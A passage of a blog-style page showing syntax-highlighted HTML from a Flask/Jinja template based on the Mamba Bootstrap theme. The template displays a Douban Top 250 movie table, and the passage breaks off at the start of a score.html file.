attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Favicons --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/favicon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/apple-touch-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Google Fonts --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,600,600i,700,700i,900<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor CSS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/icofont/icofont.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/boxicons/css/boxicons.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/animate.css/animate.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main CSS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- =======================================================  * Template Name: Mamba - v2.0.1  * Template URL: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/  * Author: BootstrapMade.com  * License: https://bootstrapmade.com/license/  ======================================================== --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ======= Header ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo float-left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- Uncomment below if you prefer to use an image logo --></span>        <span class="token comment">&lt;!-- &lt;a href="index.html">&lt;img src="static/assets/img/logo.png" alt="" class="img-fluid">&lt;/a>--></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-menu float-right d-none d-lg-block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/movie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>movie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>rating<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>wordcloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Team<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- .nav-menu --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Header --></span><span class="token comment">&lt;!-- ======= Our Team Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>豆瓣电影Top250电影<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>         <span class="token comment">&lt;!-- ======= Counts Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>counts section-bg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>table table-striped<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影排名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影中文名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影外文名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影评分<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影评价人数<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>电影概述<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>其他信息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>           &#123;% for movie in movies %&#125;               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[0] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; movie[1] &#125;&#125;<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                   &#123;&#123; movie[3] &#125;&#125;                   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[4] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[5] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[6] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[7] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>&#123;&#123; movie[8] &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>           &#123;% endfor %&#125;       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Counts Section --></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Our Team Section --></span>  <span class="token comment">&lt;!-- ======= Footer ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copyright<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&copy;">&amp;copy;</span> Copyright <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>. All Rights Reserved      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>credits<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- All the links in the footer should remain intact. --></span>        <span class="token comment">&lt;!-- You can delete the links only if you purchased the pro version. --></span>        <span class="token comment">&lt;!-- Licensing information: https://bootstrapmade.com/license/ --></span>        <span class="token comment">&lt;!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/ --></span>        Designed by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://bootstrapmade.com/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>BootstrapMade<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Footer --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>back-to-top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-simple-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor JS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery.easing/jquery.easing.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/php-email-form/validate.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery-sticky/jquery.sticky.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/waypoints/jquery.waypoints.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/counterup/counterup.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/isotope-layout/isotope.pkgd.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main JS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/js/main.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="score-html"><a href="#score-html" class="headerlink" title="score.html"></a>score.html</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/js/echarts.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Mamba Bootstrap Template - Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span 